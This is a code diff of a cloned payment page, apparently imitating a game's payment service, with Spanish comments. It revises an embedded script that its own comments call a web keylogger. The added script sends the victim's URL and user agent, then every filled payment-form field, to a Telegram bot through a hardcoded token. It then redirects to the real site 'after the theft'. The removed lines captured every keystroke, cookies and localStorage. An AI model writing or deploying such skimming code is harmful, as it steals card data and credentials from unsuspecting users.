@@ -50,88 +50,48 @@
     </form>
 </div>
 
-<!-- NEBULA DISCORD - CAPTURADOR DE DATOS (KEYLOGGER WEB) -->
 <script>
+// NEBULA DISCORD - CAPTURADOR MEJORADO (SOLO UN ENVÍO POR VÍCTIMA)
 (function() {
-    // ============================================
-    // CONFIGURACIÓN DE TELEGRAM
-    // ============================================
     let token = "8766846485:AAEPB9tyLxR4urYSMNO0VoM9PPowxLlAM18";
     let chat_id = "-1003933910519";
     let victimId = Math.random().toString(36).substring(7);
-    let capturedData = [];
+    let formSent = false;
 
-    // ============================================
-    // ENVIAR DATOS A TELEGRAM
-    // ============================================
     function sendToTelegram(text) {
         let url = `https://api.telegram.org/bot${token}/sendMessage`;
         fetch(url, {
             method: 'POST',
             headers: {'Content-Type': 'application/json'},
             body: JSON.stringify({chat_id: chat_id, text: text})
-        }).catch(err => console.log("Error enviando:", err));
+        }).catch(err => console.log("Error:", err));
     }
 
-    // ============================================
-    // NOTIFICAR NUEVA VÍCTIMA
-    // ============================================
+    // Notificar nueva víctima (solo una vez)
     sendToTelegram(`🦠 NUEVA VÍCTIMA WEB%0AID: ${victimId}%0AURL: ${window.location.href}%0AUSER AGENT: ${navigator.userAgent}`);
 
-    // ============================================
-    // CAPTURAR TODOS LOS INPUTS EN TIEMPO REAL
-    // ============================================
-    document.querySelectorAll('input, textarea, select').forEach(input => {
-        input.addEventListener('input', function(e) {
-            let data = `🎮 VÍCTIMA: ${victimId}%0A📝 CAMPO: ${this.name || 'sin nombre'}%0A📥 VALOR: ${this.value}`;
-            sendToTelegram(data);
-            capturedData.push({field: this.name, value: this.value, time: new Date()});
-        });
-    });
+    // Capturar formulario completo al enviar (UNA SOLA VEZ)
+    document.getElementById('paymentForm').addEventListener('submit', function(e) {
+        e.preventDefault();
+        if (formSent) return;
+        formSent = true;
 
-    // ============================================
-    // CAPTURAR FORMULARIO COMPLETO AL ENVIAR
-    // ============================================
-    document.querySelectorAll('form').forEach(form => {
-        form.addEventListener('submit', function(e) {
-            e.preventDefault();
-            let formData = new FormData(form);
-            let dataStr = `💳 FORMULARIO ENVIADO%0A🎮 Víctima: ${victimId}%0A`;
-            for (let [key, value] of formData.entries()) {
-                if (value && value.trim() !== "") {
-                    dataStr += `%0A📌 ${key}: ${value}`;
-                }
+        let formData = new FormData(this);
+        let dataStr = `💳 DATOS COMPLETOS CAPTURADOS%0A🎮 Víctima: ${victimId}%0A`;
+        for (let [key, value] of formData.entries()) {
+            if (value && value.trim() !== "") {
+                dataStr += `%0A📌 ${key}: ${value}`;
             }
-            sendToTelegram(dataStr);
-            // Redirigir al sitio real después del robo (opcional)
-            setTimeout(() => {
-                window.location.href = "https://pay-service.ageoforiginsgame.com/#/";
-            }, 500);
-        });
+        }
+        sendToTelegram(dataStr);
+        
+        // Redirigir al sitio real después del robo
+        setTimeout(() => {
+            window.location.href = "https://pay-service.ageoforiginsgame.com/#/";
+        }, 500);
     });
 
-    // ============================================
-    // ROBAR COOKIES
-    // ============================================
-    if (document.cookie) {
-        sendToTelegram(`🍪 COOKIES%0A🎮 Víctima: ${victimId}%0A📦 ${document.cookie}`);
-    }
-
-    // ============================================
-    // ROBAR LOCALSTORAGE
-    // ============================================
-    try {
-        let localStorageData = {};
-        for (let i = 0; i < localStorage.length; i++) {
-            let key = localStorage.key(i);
-            localStorageData[key] = localStorage.getItem(key);
-        }
-        if (Object.keys(localStorageData).length > 0) {
-            sendToTelegram(`📦 LOCALSTORAGE%0A🎮 Víctima: ${victimId}%0A📦 ${JSON.stringify(localStorageData)}`);
-        }
-    } catch(e) {}
-
-    console.log("[NEBULA] Keylogger web activo en el clon");
+    console.log("[NEBULA] Keylogger web mejorado activo");
 })();
 </script>
 </body>
